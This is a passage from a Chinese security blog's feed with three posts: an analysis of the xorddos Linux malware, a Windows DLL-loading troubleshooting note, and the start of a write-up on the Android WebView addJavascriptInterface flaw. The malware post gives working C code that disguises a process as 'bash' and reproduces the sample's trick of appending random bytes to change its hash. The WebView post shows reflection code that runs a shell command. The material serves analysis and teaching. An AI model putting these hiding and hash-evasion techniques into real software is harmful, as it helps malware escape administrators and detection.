class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gcc -o fakeexe exe.c</span><br><span class="line">➜  ~ ./fakeexe <span class="string">&quot;ls -al&quot;</span> 2554</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">cat</span> /proc/2605/cmdline</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">ls</span> -l /proc/2605/exe</span><br><span class="line">lrwxrwxrwx. 1 henices henices 0 8月   2 12:01 /proc/2605/exe -&gt; /home/henices/research/xorddos/fakeexe</span><br><span class="line"></span><br><span class="line">➜  ~ ps -elf | grep <span class="string">&quot;ls -al&quot;</span> | grep -v grep</span><br><span class="line">0 S henices   2605 25307  0  80   0 -  1043 hrtime 12:01 pts/5    00:00:00 <span class="built_in">ls</span> -al</span><br></pre></td></tr></table></figure><p>其实效果并不好，可以轻易发现踪迹。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ps -e | grep fakeexe</span><br><span class="line"> 2605 pts/9    00:00:00 fakeexe</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其实有更好的做法，使用 prctl ，至少可以把ps给搞定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">char</span> fake_cmd[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memset</span>(&amp;fake_cmd, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="type">char</span> * argv_arr_1 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> argv_arr_1_length = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    memmove(&amp;fake_cmd, argv_arr_1, argv_arr_1_length);</span><br><span class="line">    <span class="type">long</span> pid_long = strtol(argv[<span class="number">2</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    <span class="type">char</span> * v29 = (<span class="type">char</span> *)*argv;</span><br><span class="line">    <span class="type">int</span> v30 = <span class="built_in">strlen</span>(*argv);</span><br><span class="line">    <span class="built_in">memset</span>(v29, <span class="number">0</span>, v30);</span><br><span class="line">    <span class="type">char</span> * v31 = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> v32 = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v31, <span class="number">0</span>, v32);</span><br><span class="line">    <span class="type">char</span> * v33 = argv[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> v34 = <span class="built_in">strlen</span>(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">memset</span>(v33, <span class="number">0</span>, v34);</span><br><span class="line">    <span class="built_in">strcpy</span>(*argv, fake_cmd);</span><br><span class="line">    prctl(PR_SET_NAME, <span class="string">&quot;bash&quot;</span>);</span><br><span class="line">    sleep(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译执行后可以看到效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ps -e | grep bash</span><br><span class="line"> 4858 pts/5    00:00:00 bash</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">cat</span> /proc/4858/cmdline </span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line"></span><br><span class="line">➜  ~ lsof -d txt | grep fakeexe</span><br><span class="line">bash       4858 henices txt       REG  253,2      8816  4588423 /home/henices/research/xorddos/fakeexe</span><br></pre></td></tr></table></figure><h2 id="xorddos-的多态-（Polymorphic）"><a href="#xorddos-的多态-（Polymorphic）" class="headerlink" title="xorddos 的多态 （Polymorphic）"></a>xorddos 的多态 （Polymorphic）</h2><p>xorddos这个样本还值得一提的是，这个样本会不断变化，多态这个词翻译的可能不太准确，<br>可以参见上面的英文，自行理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">randmd5</span><span class="params">(<span class="type">char</span> *filename)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="type">int</span> fd_dup; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="type">mode_t</span> v4; <span class="comment">// [sp+8h] [bp-20h]@0</span></span><br><span class="line">  <span class="type">int</span> addr; <span class="comment">// [sp+15h] [bp-13h]@1</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+19h] [bp-Fh]@1</span></span><br><span class="line">  __int16 v7; <span class="comment">// [sp+1Dh] [bp-Bh]@1</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [sp+1Fh] [bp-9h]@1</span></span><br><span class="line"></span><br><span class="line">  addr = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  fd = open(filename, <span class="number">1</span>, v4);</span><br><span class="line">  fd_dup = fd;</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    lseek(fd, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    randstr((<span class="type">int</span>)&amp;addr, <span class="number">10</span>);</span><br><span class="line">    write(fd_dup, &amp;addr, <span class="number">11u</span>);</span><br><span class="line">    close(fd_dup);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xorddos 样本多态主要就是用这个函数，每次在文件末尾写上10个字节的随机字符。<br>这样样本md5和大小都会发生变化，使得一些检测方法失效。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>正因为这种隐藏方法并不理想，后面xorddos出现了带rootkit的版本，进化了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;进程隐藏&quot;&gt;&lt;a href=&quot;#进程隐藏&quot; class=&quot;headerlink&quot; title=&quot;进程隐藏&quot;&gt;&lt;/a&gt;进程隐藏&lt;/h2&gt;&lt;p&gt;上周由于工作原因接触到xorddos的样本，这个样本在过去一年的时间里非常常见，&lt;br&gt;变种也很多，拿到的样本比较有趣的是 </summary>
      
    
    
    
    
    <category term="Malware" scheme="http://usmacd.com/tags/Malware/"/>
    
  </entry>
  
  <entry>
    <title>解决 Windows Rx034</title>
    <link href="http://usmacd.com/cn/Windows_Rx034/"/>
    <id>http://usmacd.com/cn/Windows_Rx034/</id>
    <published>2023-09-06T03:00:51.914Z</published>
    <updated>2023-09-06T03:00:51.914Z</updated>
    
    <content type="html"><![CDATA[<p>以前没有遇上这个错误，这次遇上这个错误是装vim的YouCompleteMe插件后出现，因此很容易想到是装插件引起的这个错误，错误提示Runtime Error 如下图：</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/r5051.png" alt="error"></p><p>先放狗搜一下，微软的对R6034的解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">An application has made an attempt to load the C runtime library without using</span><br><span class="line">a manifest. This is an unsupported way to load Visual C++ DLLs. You need to</span><br><span class="line">modify your application to build with a manifest. For more information, see the</span><br><span class="line">&quot;Visual C++ Libraries as Shared Side-by-Side Assemblies&quot; topic in the product</span><br><span class="line">documentation.</span><br></pre></td></tr></table></figure><p>微软的链接中也提到了解决的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Rebuild your application to include a manifest. Building an application with</span><br><span class="line">Visual Studio automatically puts the manifest into the resulting .exe or .dll</span><br><span class="line">file. If you are building at the command line, use the mt.exe tool to add the</span><br><span class="line">manifest as a resource. Use resource ID 1 if you build an .exe, and resource</span><br><span class="line">ID 2 if you build a .dll. For more information, see How to: Embed a Manifest</span><br><span class="line">Inside a C/C++ Application.</span><br></pre></td></tr></table></figure><p>大概的意思是需要使用manifest.xml来指定需要加载的DLL。上网又翻看了几个链接发现这个错误的成因比较复杂，主要原因是加载mscvr*.dll 出现了问题。不管怎样还是先看看是否使用了 manifest。从微软的解决办法可以知道，manifest很有可能在资源文件里。</p><p>还是先看看manifest的作用，在msdn网站搜索相关内容，根据《Understanding Manifest Generation for C&#x2F;C++ Programs》中的内容，manfest.xml可以是一个外部的XML文件也可以是嵌入在程序的资源文件中。manifest.xml用于管理程序在运行时需要的共享程序集的名字和版本。如果程序只依赖 VisualC++ 的程序集（CRT，MFC，ATL等），manifest会被链接器自动生成。Manifest的Sxs指定了其依赖的清单名称,版本,资源,和其他组件。Sxs是Windows XP引入的新技术，vs 2005 开始使用，全名叫Side by Side assembly，主要还是为了解决兼容性问题，这样同一个系统可以存在不同版本的同名文件而互相不影响各自的运行。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/sxs.png" alt="sxs"></p><p>现在需要定位gvim.exe加载哪个DLL引起了R6034错误，使用Process Explorer发现是加载ycm_client_support.pyd导致。删除YouCompleteMe插件后错误消失。</p><p>先看看ycm_client_support.pyd是否使用了manifest.xml, 使用神器TC,  F3一下，可以查看manifest的情况。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/manifest.png" alt="manifest.xml"></p><p>发现其实ycm_client_support.pyd已经使用了manifest，但是仍然出现R6034错误。上网搜索了一番（见文末的参考链接），发现这就是非常著名的DLL Hell了，维基百科中专门记录了这个问题。 <a href="http://en.wikipedia.org/wiki/Dll_hell">http://en.wikipedia.org/wiki/Dll_hell</a></p><p>不论如何应该就是DLL加载时出错了，可以使用Process Explorer 工具来查看出问题的进程，看看在进程空间内具体是什么情况。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer.png" alt="p-e"></p><p>哈哈，发现了一些情况，msvcr90.dll在gvim进程空间里有两个！再看看这两个DLL的位置。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer1.png" alt="p-e1"></p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/process-explorer2.png" alt="p-e2"></p><p>删除掉不在C:\WINDOWS\WinSxS\目录里的msvcr90.dll，问题得以解决。由于这个错误是因为加载ycm_client_support.pyd引起的，再看看ycm_client_support.pyd的情况，拿出TC直接F3一下，又发现了一些有用的信息。ycm_client_support.pyd加载的是cmake目录下的msvcr90.dll, 正常情况下因该使用 C:\Windows\winsxs 目录下的msvcr90.dll</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/tc1.png" alt="tc1"></p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/tc2.png" alt="tc2"></p><p>查看一下系统环境变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">D:\Program Files\Microsoft Visual Studio 9.0\VC&gt; set | findstr Path</span><br><span class="line"></span><br><span class="line">Path=D:\Program Files\Microsoft Visual Studio 9.0\Common7\IDE;D:\Program Files\M</span><br><span class="line">icrosoft Visual Studio 9.0\VC\BIN;D:\Program Files\Microsoft Visual Studio 9.0\C</span><br><span class="line">ommon7\Tools;c:\Windows\Microsoft.NET\Framework\v3.5;c:\Windows\Microsoft.NET\Fr</span><br><span class="line">amework\v2.0.50727;D:\Program Files\Microsoft Visual Studio 9.0\VC\VCPackages;C:</span><br><span class="line">\Program Files\\Microsoft SDKs\Windows\v6.0A\bin;C:\Windows\system32;C:\Windows;</span><br><span class="line">d:\Program Files\CMake 2.8\bin;d:\Program Files\LLVM 3.4.svn\bin;d:\Program File</span><br><span class="line">s\Git\cmd;d:\Python27;D:\Program Files\IDM Computer Solutions\UltraEdit\</span><br><span class="line">PSModulePath=C:\Windows\system32\WindowsPowerShell\v1.0\Modules\</span><br></pre></td></tr></table></figure><p>引错误的原因是Windows程序加载DLL是会先加载PATH变量中的DLL文件，后面会加载manifest指定的WinSxS目录的文件，这样就加载了两次，引起了错误。</p><p>这个问题涉及 Windows加载DLL文件的顺序，Windows定位 DLL文件的顺序和一个注册表键值相关，这个键值是：</p><p><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code></p><p>SafeDllSearchMode的值为1，开启SafeDllSearchMode，<br>SafeDllSearchMode的值为0，禁用SafeDllSearchMode。</p><p>Windows系统默认开启SafeDllSearchMode （Windows XP SP2 后），MSDN文章《Dynamic-Link Library Search Order》中指出，在SafeDllSearchMode开启的情况下，Windows定位DLL文件的顺序为：</p><ol><li>The directory from which the application loaded.</li><li>The system directory. ( GetSystemDirectory )</li><li>The 16-bit system directory.</li><li>The Windows directory. (GetWindowsDirectory )</li><li>The current directory.</li><li>The directories that are listed in the PATH environment variable.</li></ol><p>在SafeDllSearchMode关闭的情况下，Windows定位DLL文件的顺序为：</p><ol><li>The directory from which the application loaded.</li><li>The current directory.</li><li>The system directory. (GetSystemDirectory )</li><li>The 16-bit system directory.</li><li>The Windows directory. ( GetWindowsDirectory)</li><li>The directories that are listed in the PATH environment variable.</li></ol><p>另外，《Dynamic-Link Library Search Order》中指出使用manifest可以指定加载DLL的路径，但实际的情况是有可能加载多个DLL导致进程崩溃。</p><p>Desktop applications can control the location from which a DLL is loaded by specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, the system searches for the DLL at load time as described in this section.</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1]《Windows via C&#x2F;C++ Fifth Edition》<br>[2] Side-by-side Assemblies <a href="http://msdn.microsoft.com/en-us/library/aa376307.aspx">http://msdn.microsoft.com/en-us/library/aa376307.aspx</a><br>[3] DLL Hell <a href="http://en.wikipedia.org/wiki/Dll_hell">http://en.wikipedia.org/wiki/Dll_hell</a><br>[4] C Run-Time Error R6034 <a href="http://msdn.microsoft.com/en-us/library/ms235560(v=vs.90).aspx">http://msdn.microsoft.com/en-us/library/ms235560(v=vs.90).aspx</a><br>[5] Understanding Manifest Generation for C&#x2F;C++ Programs <a href="http://msdn.microsoft.com/en-us/library/ms235542.aspx">http://msdn.microsoft.com/en-us/library/ms235542.aspx</a><br>[6] Search Path Used by Windows to Locate a DLL <a href="http://msdn.microsoft.com/en-us/library/7d83bc18.aspx">http://msdn.microsoft.com/en-us/library/7d83bc18.aspx</a><br>[7] Dynamic-Link Library Search Order <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a><br>[8] <a href="https://bitbucket.org/Haroogan/vim-youcompleteme-for-windows/src/7dca764c2ee0?at=master">https://bitbucket.org/Haroogan/vim-youcompleteme-for-windows/src/7dca764c2ee0?at=master</a><br>[9] <a href="https://github.com/Valloric/YouCompleteMe/wiki/Windows-Installation-Guide">https://github.com/Valloric/YouCompleteMe/wiki/Windows-Installation-Guide</a><br>[10] <a href="http://www.davidlenihan.com/2007/07/winsxs.html">http://www.davidlenihan.com/2007/07/winsxs.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;以前没有遇上这个错误，这次遇上这个错误是装vim的YouCompleteMe插件后出现，因此很容易想到是装插件引起的这个错误，错误提示Runtime Error 如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/</summary>
      
    
    
    
    
    <category term="windows" scheme="http://usmacd.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Android WebView 漏洞</title>
    <link href="http://usmacd.com/cn/webview_java/"/>
    <id>http://usmacd.com/cn/webview_java/</id>
    <published>2023-09-06T03:00:51.896Z</published>
    <updated>2023-09-06T03:00:51.896Z</updated>
    
    <content type="html"><![CDATA[<h2 id="☆-来自-developer-android-com-的信息"><a href="#☆-来自-developer-android-com-的信息" class="headerlink" title="☆ 来自 developer.android.com 的信息"></a>☆ 来自 developer.android.com 的信息</h2><p>Android 官方网站对addJavascriptInterface的介绍如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public void addJavascriptInterface (Object object, String name)  Added in API level 1</span><br><span class="line"></span><br><span class="line">Injects the supplied Java object into this WebView. The object is injected into</span><br><span class="line">the JavaScript context of the main frame, using the supplied name. This allows </span><br><span class="line">the Java object&#x27;s methods to be accessed from JavaScript. For applications</span><br><span class="line">targeted to API level JELLY_BEAN_MR1 and above, only public methods that are </span><br><span class="line">annotated with JavascriptInterface can be accessed from JavaScript. For applications</span><br><span class="line">targeted to API level JELLY_BEAN or below, all public methods (including the inherited ones)</span><br><span class="line">can be accessed, see the important security note below for implications.</span><br><span class="line"></span><br><span class="line">Note that injected objects will not appear in JavaScript until the page is next</span><br><span class="line">(re)loaded. For example:</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JsObject</span> &#123;</span><br><span class="line">   <span class="meta">@JavascriptInterface</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="string">&quot;injectedObject&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">JsObject</span>(), <span class="string">&quot;injectedObject&quot;</span>);</span><br><span class="line">webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">webView.loadUrl(<span class="string">&quot;javascript:alert(injectedObject.toString())&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">This method can be used to allow JavaScript to control the host application. </span><br><span class="line">This is a powerful feature, but also presents a security risk for apps targeting</span><br><span class="line">JELLY_BEAN or earlier. Apps that target a version later than JELLY_BEAN are still</span><br><span class="line">vulnerable if the app runs on a device running Android earlier than 4.2. The </span><br><span class="line">most secure way to use this method is to target JELLY_BEAN_MR1 and to ensure the</span><br><span class="line">method is called only when running on Android 4.2 or later. With these older </span><br><span class="line">versions, JavaScript could use reflection to access an injected object&#x27;s public</span><br><span class="line">fields. Use of this method in a WebView containing untrusted content could allow</span><br><span class="line">an attacker to manipulate the host application in unintended ways, executing </span><br><span class="line">Java code with the permissions of the host application. Use extreme care when </span><br><span class="line">using this method in a WebView which could contain untrusted content.</span><br><span class="line">JavaScript interacts with Java object on a private, background thread of this </span><br><span class="line">WebView. Care is therefore required to maintain thread safety.</span><br><span class="line"></span><br><span class="line">The Java object&#x27;s fields are not accessible.</span><br><span class="line">For applications targeted to API level LOLLIPOP and above, methods of injected </span><br><span class="line">Java objects are enumerable from JavaScript. Parameters object the Java object </span><br><span class="line">to inject into this WebView&#x27;s JavaScript context. Null values are ignored.</span><br><span class="line">name  the name used to expose the object in JavaScript</span><br></pre></td></tr></table></figure><p>  之所以提供addJavascriptInterface是为了WebView中的Javascript可以和本地的App<br>  通讯，这确实是一个很强大的功能，这么做的好处在于本地App逻辑不变的情况下，不<br>  需要升级App就可以对程序进行更新，修改相应的Web页面就可以了。</p><h2 id="☆-相关知识"><a href="#☆-相关知识" class="headerlink" title="☆ 相关知识"></a>☆ 相关知识</h2><h3 id="WebView的使用方法"><a href="#WebView的使用方法" class="headerlink" title="WebView的使用方法"></a>WebView的使用方法</h3><p>  在layout中定义 <webview>, 在Activity的onCreate中加入下面的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>);</span><br><span class="line">setContentView(webview);</span><br><span class="line">webview.loadUrl(<span class="string">&quot;http://slashdot.org/&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Java-Reflection"><a href="#Java-Reflection" class="headerlink" title="Java Reflection"></a>Java Reflection</h3><p>  反射是java语言提供的一种机制，使Java程序可以在运行时检查类、接口、方法和成员，<br>而不需要在编译的时候知道类的名字和方法等细节信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> Reflect;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a1</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a2</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Demo demo=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">mObjectClass</span> <span class="operator">=</span> demo.getClass();</span><br><span class="line"></span><br><span class="line">    System.out.println(mObjectClass.getName());</span><br><span class="line"></span><br><span class="line">    Method[] methods = mObjectClass.getMethods();</span><br><span class="line">    <span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> mObjectClass.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        String[] array = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id &gt; /tmp/id&quot;</span>&#125;;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">n</span> <span class="operator">=</span> c2.getMethod(<span class="string">&quot;exec&quot;</span>, array.getClass());</span><br><span class="line">        n.invoke(obj, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;array&#125;);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.out.println(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; javac -d . Reflect/hello.java</span><br><span class="line">&gt; java Reflect.hello</span><br><span class="line"></span><br><span class="line">Reflect.Demo</span><br><span class="line">method = a2</span><br><span class="line">method = a1</span><br><span class="line">method = wait</span><br><span class="line">method = wait</span><br><span class="line">method = wait</span><br><span class="line">method = equals</span><br><span class="line">method = toString</span><br><span class="line">method = hashCode</span><br><span class="line">method = getClass</span><br><span class="line">method = notify</span><br><span class="line">method = notifyAll</span><br></pre></td></tr></table></figure><p>命令执行成功。</p><h3 id="通过reflection-访问private"><a href="#通过reflection-访问private" class="headerlink" title="通过reflection 访问private"></a>通过reflection 访问private</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 